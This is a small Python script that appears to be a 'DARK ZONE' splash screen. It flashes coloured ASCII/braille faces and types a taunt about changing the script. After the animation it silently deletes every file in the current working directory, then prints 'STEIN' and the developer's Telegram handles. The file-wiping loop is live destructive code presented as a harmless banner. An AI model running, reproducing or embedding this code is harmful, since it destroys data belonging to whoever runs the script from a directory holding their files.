import time
import os
import sys
import pyfiglet
from colorama import Fore, init

# Initialize colorama
init(autoreset=True)

def main():
    # Print welcome message in blue to purple
    print(Fore.BLUE + "Hey WELCOME TO DARK ZONE")
    time.sleep(2)

    # Start switching between text1 and text2
    start_time = time.time()
    while time.time() - start_time < 4:
        # Print text1
        print(Fore.BLUE + """
⣿⣿⣿⣿⣿⣿⡟⠁⠄⠄⠄⠄⣠⣤⣴⣶⣶⣶⣶⣤⡀⠈⠙⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠄⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠄⠈⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠁⠄⠄⠄⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⢺⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡄⠄⠄⠄⠙⠻⠿⣿⣿⣿⣿⠿⠿⠛⠛⠻⣿⡄⠄⣾⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡇⠄⠄⠁ 👁️ ⠄⢹⣿⡗⠄ 👁️ ⢄⡀⣾⢀⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡇⠘⠄⠄⠄⢀⡀⠄⣿⣿⣷⣤⣤⣾⣿⣿⣿⣧⢸⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡇⠄⣰⣿⡿⠟⠃⠄⣿⣿⣿⣿⣿⡛⠿⢿⣿⣷⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡄⠈⠁⠄⠄⠄⠄⠻⠿⢛⣿⣿⠿⠂⠄⢹⢹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡐⠐⠄⠄⣠⣀⣀⣚⣯⣵⣶⠆⣰⠄⠞⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣷⡄⠄⠄⠈⠛⠿⠿⠿⣻⡏⢠⣿⣎⣾⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡿⠟⠛⠄⠄⠄⠄⠄⠙⣛⣿⣿⣵⣿⡿⢹⡟⣿⣿⣿⣿⣿
""")
        time.sleep(0.1)
        os.system('cls' if os.name == 'nt' else 'clear')

        # Print text2
        print(Fore.GREEN + """
⠀⠀⠀⠀⠀⠀⢠⣾⣻⣻⣻⣻⠟⠛⠋⠉⠉⠉⠉⠛⢿⣷⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣻⣻⣻⣻⣻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣻⣷⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣾⣻⣻⣻⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⣻⡅⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢻⣻⣻⣻⣦⣄⣀⠀⠀⠀⠀⣀⣀⣤⣤⣄⠀⢻⣻⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣻⣻⣾ 👁️ ⣻⡆⠀⢨⣻ 👁️ ⡻⢿⠁⡿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣧⣻⣻⣻⡿⢿⣻⠀⠀⠈⠛⠛⠁⠀⠀⠀⠘⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣻⠏⠀⢀⣠⣼⣻⠀⠀⠀⠀⠀⢤⣀⡀⠀⠈⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢻⣷⣾⣻⣻⣻⣻⣄⣀⡤⠀⠀⣀⣽⣻⡆⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢯⣯⣻⣻⠟⠿⠿⠥⠐⠊⠉⣹⠏⣻⣡⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⢻⣻⣻⣷⣤⣀⣀⣀⠄⢰⡟⠀⠱⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣠⣤⣻⣻⣻⣻⣦⠤⠀⠀⠊⠀⢀⡆⢠⠀⠀⠀⠀⠀
""")
        time.sleep(0.1)
        os.system('cls' if os.name == 'nt' else 'clear')

    # Print message after 4 seconds, one character at a time
    for char in "Why you Tried to change the script? You know it don't work when you change things brother.\n":
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.1)
    print()

    # Print "I hope you understand things now?" one character at a time
    for char in "I hope you understand things now?\n":
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.1)
    print()

    # Delete all files in the directory
    for filename in os.listdir('.'):
        if os.path.isfile(filename):
            os.remove(filename)

    # Print "STEIN" using pyfiglet and colorama
    stein_art = pyfiglet.figlet_format("STEIN")
    print(Fore.RED + stein_art)

    # Additional information using colorama
    print(Fore.BLUE + "DEVELOPER : @demonpis TELEGRAM")
    print(Fore.BLUE + "CHANNEL: @kyixo TELEGRAM")

    time.sleep(4)

if __name__ == "__main__":
    main()
